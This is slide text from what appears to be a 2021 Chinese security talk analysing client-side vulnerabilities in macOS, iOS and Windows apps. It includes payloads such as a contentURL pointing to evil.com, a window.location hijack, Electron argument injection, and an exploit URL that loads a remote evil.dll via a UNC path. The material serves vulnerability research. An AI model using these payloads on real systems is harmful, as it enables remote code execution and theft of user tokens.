• 根据 contentURL 拼接 Info.plist 的地址 
• 没有任何域名限制，只需要⽀持 CORS 
• Info.plist 为⼀个 JSON array，标记⽂档可⽤的 locale 
• 根据语⾔载⼊国际化的数据 content.json 
• 例如 en，则继续载⼊ /English.lproj/content.json
// this is a content page 
var targetIDContent = dataController.getContentForObjectWithID(targetID); 
// add the new content 
$content.append(targetIDContent); // /?lang=en&contentURL=//evil.com/
#apd00AB7903-79D8-4AD5-9CC2-F423F9A5D835
/Info.json 
/English.lproj/contentjson-version.txt 
/English.lproj/content.json
利⽤
• 在 macOS Mojave 或更早版本上结合 NFS 可以全盘读⽂件 
• 可惜和 help: 不是同⼀个 WebView，不⽀持 AppleScript 
• 可以打开本地除 file:/// 之外任意 URL scheme 
• 差⼀点就可以弹计算器了 
• 这个 WebView 没有沙箱，但是也没有 JIT 
• 任何 DOM 漏洞都可以直接获取完整远程代码执⾏权限 
• 例如之前打过 Pwn2Own 的 SQLite
某 iOS App 跨应⽤获取 cookie
app://webview?url=http://example.com
http://example.com
app://webview?url=http://example.com
Bug
• app:// 协议可在 App WebView 中打开指定 URL 
• 限定了 example.com 
• 由于历史遗留需求，资产⾥有⼀个解析到本地的域名 
• localhost.example.com -> 127.0.0.1 
• 以上是两个毫不相⼲的业务 
• app://webview?url=http://localhost.example.com
http://localhost.example.com
app://webview?url=http://localhost.example.com
http://localhost.example.com
恶意 App 
http://127.0.0.1
利⽤
• iOS 允许监听 80（http 默认）端⼝ 
• 其他主流系统需要 sudo 或管理员 
• 在本地开⼀个 http 服务，使⽤系统 API 允许⾃身后台运⾏ 
• ⽤ app://webview?url=http://localhost.example.com 跳转到受害 App 
• 受害 App 访问恶意 App 的⽹⻚ 
• 由于⽹址满⾜ *.example.com 
• 可以读取到⼀级域名下的 cookie 
• 并允许调⽤ native bridge 执⾏更多敏感功能
iOS WebView UXSS
WebView
• UIWebView 默认允许 allowUniversalAccessFromFileURLs 
• 只要从 file:/// 域加载可控的 HTML 即可造成 UXSS 
• 读取 app 任意⽂件以及访问任意远程 http 地址 
• 场景：私信或⽹盘的共享⽂件、HTML 格式的电⼦书、邮件附件、浏览器、系
统 Files ⽂件关联等处的⽂件预览 
• 早被玩烂了
某社交⽹络 iOS 官⽅客户端 
私信发送点开即中
另⼀种类 UXSS
• WebView 暴露接⼝向特定域名⻚⾯添加额外功能 
• 通常需要鉴权 
• 以域名为粒度 
• 如果鉴权出现问题？
• 如何从 UIWebView 获得当前⽹
址？ 
• StackOverflow 上，最容易搜索
到的答案是通过 js 的返回值 
• window.location 
• 可靠吗？
•原⽣只读对象可以被 js 劫持 
•曾是 Chrome 和 WebKit 通
⽤的技巧 
•Chrome 系已修复，然⽽截
⽌撰写本 talk 的 2021 年6 
⽉，最新的 Safari 仍然可⽤
漏洞
• location 对象默认只读 
• 截⽌ 2021 年 6 ⽉ 24 ⽇，Safari ⽤的 JavaScriptCore 仍然允许覆盖 
window.location 
• 在全局作⽤域声明⼀个函数 function location() {} 即可⾃动提升，直接替换 
window.location 为⾃定义变量 
• WebView 读取到的 URL 可能被劫持成任意字符串 
• 包括各种变体 location.href、location.toString() 等
案例
• ⼀短视频 App 可以在私信、群组中发送链接 
• 曾经使⽤ UIWebView 并存在 location 劫持 bug 
• WebView 提供了⼀组 API ⽤于访问当前登录的账户 
• 鉴权使⽤了具有安全隐患的 js 
• 恶意⽹⻚直接返回可信域名造成绕过 
• 任意⽹⻚均可访问⽤户 token
思考
• 漏洞原因是 JavaScriptCore 处理变量作⽤域的⾏为 
• 同时影响 UIWebView 和 WKWebView 
• 但通常只有⽤了 UIWebView 的 App 会出现此类问题
思考
• UIWebView 历史悠久，⽹上有很多陈旧的资料误导⼈ 
• 通常 iOS 开发者不喜欢⽤异步函数，需要考虑线程切换等麻烦的问题 
• UIWebView 的 stringByEvaluatingJavaScriptFromString 直接阻塞返回 
• 对应 WKWebView 是异步回调 
•  UIWebView 正规的获取地址⽅式存在 bug 
• webview.request.URL.absoluteString 在⻚⾯有多个资源请求时返回的不是主⽂档 
• 更好的⽅式是在 webViewDidFinishLoad 事件使⽤ webview.request.mainDocumentURL 
• WKWebView 很简单：webView.URL
AppStore 审核⽬前 
已禁⽌使⽤ UIWebView
2020 年 10 ⽉的 Pull Request
• WKWebView 仍然可以启⽤不安全
的 UXSS 选项 
• 即使彻底淘汰 UIWebView 还是有
出 bug 的可能
某视频客户端远程 dll 注⼊
URL scheme 参数注⼊
• Windows 下的 URL Scheme 和运⾏命令⽤了同⼀个 API ShellExecute 
• URL scheme 协议关联由于历史原因不能处理好引号闭合问题 
• 存在参数注⼊⻛险 
• 如 Electron 的 CVE-2018-1000006
proto://
electron.exe "%1"
electron.exe "proto://%1"
electron.exe "proto://" --no-sandbox ""
参数注⼊
if (_wstricmp(arg[i], L”-loadmodule", 0) != -1) { 
    handle = LoadLibraryExW(arg[i + 1], 0, 8u); 
    lpFunc = GetProcAddress(handle, "**_LoadModule_WinMain"); 
    // ... 
} 
判断 loadmodule 选项，有则加载 DLL
live://" --loadmodule "evil.dll"
• 从浏览器跳转本地应⽤会弹窗确认 
• 静默的⼊⼝？
本地 HTTP 服务
从 Web 拉起客户端
C:\Users\haha>curl http://localhost:12345/getinfo -v 
> GET /getinfo HTTP/1.1 
> Host: localhost:11066 
> User-Agent: curl/7.55.1 
> Accept: */* 
> 
* HTTP 1.0, assume close after body 
< HTTP/1.0 200 OK 
< Content-Type: text/html 
< Server: LocalWeb Server 
< Content-Length: 64 
< Accept-Ranges: bytes 
< Access-Control-Allow-origin: * 
< Connection: close 
< 
clientinfo({"ver" : "10.12.2789.0" , "_ver" : 50180920})
JSONP + 通配符 CORS 
任意浏览器任意⽹站均可访问
本地 HTTP 服务
从 Web 拉起客户端
http://127.0.0.1:12345/startclient?cmd=live://
• 转换成 URL scheme 唤起客户端 
• 存在 bug，⽆法正确处理 encodeURLComponent 
• 闭合参数的半⻆引号会变成 %22，⽆法注⼊
本地 HTTP 服务
从 Web 拉起客户端
http://127.0.0.1:12345/pullclientjpg?cmd=live://
• 修复了 URL 编码的接⼝，完美触发
利⽤
• LoadLibrary 可以加载本地路径 
• 在 Windows 下使⽤ UNC path 可以访问远程⽂件 
• \\hostname\path\to.dll 
• 协议 
• SMB 
• WebDAV
利⽤
处理 DllMain 的 DLL_PROCESS_ATTACH 事件即可
BOOL APIENTRY DllMain(HMODULE hModule,  
    DWORD ul_reason_for_call, LPVOID lpReserved) 
{ 
    switch (ul_reason_for_call) { 
        case DLL_PROCESS_ATTACH: 
            // post exploit 
            break; 
        case DLL_THREAD_ATTACH: 
        case DLL_THREAD_DETACH: 
        case DLL_PROCESS_DETACH: 
            break; 
    } 
    return TRUE; 
}
两种共享协议对⽐
• SMB 
• 由于多次被滥⽤（蠕⾍等），在公
⽹上被过滤 
• Windows 资源管理器开启⽂件共
享即可 
• 也可以使⽤ samba 等开源服务器
• WebDAV 
• 基于 HTTP 协议扩展 
• IIS ⽀持，但配置稍微麻烦 
• 建议使⽤ Python 实现的 
• http://github.com/wolf71/
TinyWebDav
最终利⽤
http://127.0.0.1:12345/pullclientjpg?cmd=live://%22%20-
loadmodule%20%22%5C%5Cexample.com%5Chaha%5Cevil.dll%22%20%22
触发⽅式
• 浏览器 1click 
• 打开恶意⽹⻚，⽹⻚通过任意标签向 127.0.0.1 发起 URL 请求即可 
• 甚⾄不需要 javascript 
• 远程 0click 
• 本地服务实际开在 0.0.0.0 上导致可以局域⽹访问 
• 处在可达的同⼀⽹络内且知道对⽅ IP 即可
⼩结
⼩结
• 案例分析了⼏个不同平台的客户端软件漏洞 
• 攻击⾯ 
• URL scheme 
• 桌⾯端的开放端⼝ 
• 特别是 http 服务 
• 难以简单分类的 bug 
• 发散性的条件组合
感谢聆听